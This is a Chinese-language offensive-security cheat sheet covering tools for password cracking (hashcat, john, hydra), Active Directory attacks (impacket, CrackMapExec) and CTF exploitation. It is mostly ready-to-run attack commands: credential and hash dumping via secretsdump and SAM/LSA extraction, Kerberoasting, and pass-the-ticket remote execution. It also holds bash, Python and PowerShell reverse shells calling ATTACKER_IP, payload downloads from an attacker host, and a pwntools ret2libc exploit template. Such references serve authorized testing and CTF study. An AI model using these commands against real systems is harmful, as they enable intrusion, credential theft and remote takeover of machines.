# 工具速查

## 常用工具一览

| 类别 | 工具 | 用途 |
|------|------|------|
| 端口扫描 | nmap, masscan, rustscan | 主机发现、服务识别 |
| Web扫描 | ffuf, gobuster, feroxbuster | 目录/文件枚举 |
| 漏洞扫描 | nuclei, nikto | 自动化漏洞检测 |
| 渗透框架 | metasploit, impacket | 漏洞利用、AD攻击 |
| Web代理 | burpsuite, mitmproxy | 流量拦截/修改 |
| 逆向 | IDA, Ghidra, Binary Ninja | 静态逆向分析 |
| 调试 | GDB+pwndbg, x64dbg, WinDbg | 动态调试 |
| 动态插桩 | frida, PIN, DynamoRIO | 运行时分析 |
| PE分析 | pestudio, pefile, diec | PE文件静态分析 |
| 流量分析 | wireshark, tshark, zeek | 网络包分析 |
| 密码破解 | hashcat, john, hydra | 哈希破解、爆破 |
| AD攻击 | BloodHound, mimikatz, impacket | 域内渗透 |
| 漏洞利用 | pwntools, pwndbg, ROPgadget | CTF/漏洞利用 |
| 隐写 | steghide, zsteg, stegsolve | 图片隐写分析 |
| 取证 | volatility, autopsy, binwalk | 内存/磁盘取证 |

## Hashcat

```bash
# 模式
-m 0    MD5
-m 100  SHA1
-m 1800 sha512crypt (Linux /etc/shadow)
-m 1000 NTLM
-m 5600 NetNTLMv2
-m 13100 Kerberos TGS-REP (Kerberoasting)
-m 18200 Kerberos AS-REP (AS-REP Roasting)

# 攻击模式
-a 0    字典攻击
-a 3    掩码攻击 (?l=小写 ?u=大写 ?d=数字 ?s=符号)
-a 6    字典+掩码混合

# 示例
hashcat -m 0 -a 0 hash.txt rockyou.txt
hashcat -m 1000 -a 3 ntlm.txt ?u?l?l?l?d?d?d?d
hashcat -m 0 hash.txt rockyou.txt --rules-file best64.rule
```

## John the Ripper

```bash
john --wordlist=rockyou.txt hash.txt
john --format=NT hash.txt                    # NTLM
john --format=sha512crypt shadow.txt         # Linux shadow
john --show hash.txt                         # 显示已破解
ssh2john id_rsa > id_rsa.hash && john id_rsa.hash  # SSH私钥
zip2john archive.zip > zip.hash && john zip.hash
```

## Hydra 爆破

```bash
hydra -l admin -P rockyou.txt ssh://target
hydra -L users.txt -P passwords.txt ftp://target
hydra -l admin -P rockyou.txt target http-post-form \
    "/login:username=^USER^&password=^PASS^:Invalid credentials"
hydra -l admin -P rockyou.txt target http-get /admin/
```

## impacket 工具集

```bash
# 远程执行
impacket-psexec domain/user:pass@target
impacket-wmiexec domain/user:pass@target
impacket-smbexec domain/user:pass@target

# 信息收集
impacket-GetADUsers domain/user:pass -all -dc-ip DC_IP
impacket-GetUserSPNs domain/user:pass -dc-ip DC_IP -request  # Kerberoasting
impacket-GetNPUsers domain/ -usersfile users.txt -dc-ip DC_IP  # AS-REP Roasting

# 哈希/票据
impacket-secretsdump domain/user:pass@target
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL

# SMB
impacket-smbclient domain/user:pass@target
impacket-smbserver share /path/to/share -smb2support

# 票据传递
impacket-psexec -k -no-pass target  # 使用 Kerberos 票据
export KRB5CCNAME=ticket.ccache
```

## CrackMapExec / NetExec

```bash
cme smb 192.168.1.0/24 -u user -p pass         # 批量验证
cme smb target -u user -p pass --sam            # 提取 SAM
cme smb target -u user -p pass --lsa            # 提取 LSA
cme smb target -u user -H NTLM --exec-method smbexec -x "whoami"
cme winrm target -u user -p pass -x "whoami"
cme ldap DC -u user -p pass --asreproast asrep.txt
cme ldap DC -u user -p pass --kerberoasting kerb.txt
```

## One-liners 速查

```bash
# 快速反弹 Shell
# Bash
bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'
# Python
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("ATTACKER_IP",PORT));[os.dup2(s.fileno(),fd) for fd in(0,1,2)];pty.spawn("/bin/bash")'
# PowerShell
powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('ATTACKER_IP',PORT);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$o=(iex $d 2>&1|Out-String);$s.Write([text.encoding]::ASCII.GetBytes($o),0,$o.Length)}"

# 监听
nc -lvnp PORT
rlwrap nc -lvnp PORT  # 带历史记录

# TTY 升级
python3 -c 'import pty;pty.spawn("/bin/bash")'
stty raw -echo; fg
export TERM=xterm; stty rows 40 cols 200

# 端口转发 (socat)
socat TCP-LISTEN:8080,fork TCP:internal:80
# SSH
ssh -L LOCAL_PORT:TARGET:TARGET_PORT user@JUMP

# 文件传输
# Python HTTP server
python3 -m http.server 8080
# 下载
wget http://attacker/file -O /tmp/file
curl -o /tmp/file http://attacker/file
certutil -urlcache -f http://attacker/file C:\Windows\Temp\file  # Windows
iwr http://attacker/file -OutFile C:\Temp\file                   # PowerShell

# 快速端口扫描 (无工具)
for port in 22 80 443 8080 3306 3389; do
    (echo >/dev/tcp/target/$port) &>/dev/null && echo "$port open"
done
```

## pwntools 模板

```python
#!/usr/bin/env python3
from pwn import *

BINARY = "./target"
LIBC   = "./libc.so.6"

elf  = ELF(BINARY)
libc = ELF(LIBC)

context.binary = elf
context.log_level = "info"

def conn():
    if args.REMOTE:
        return remote("host", port)
    elif args.GDB:
        return gdb.debug(BINARY, gdbscript="""
            b main
            c
        """)
    else:
        return process(BINARY)

def exploit():
    p = conn()
    
    # === 阶段一：泄露 ===
    payload = b""
    # ...
    
    p.recvuntil(b"input: ")
    p.sendline(payload)
    
    leak = u64(p.recvuntil(b"\n")[:-1].ljust(8, b"\x00"))
    log.info(f"Leak: {hex(leak)}")
    
    libc.address = leak - libc.symbols["puts"]
    log.info(f"libc base: {hex(libc.address)}")
    
    # === 阶段二：利用 ===
    system = libc.symbols["system"]
    binsh  = next(libc.search(b"/bin/sh\x00"))
    
    # ...
    
    p.interactive()

exploit()
# 运行: python3 exploit.py
#       python3 exploit.py REMOTE
#       python3 exploit.py GDB
```
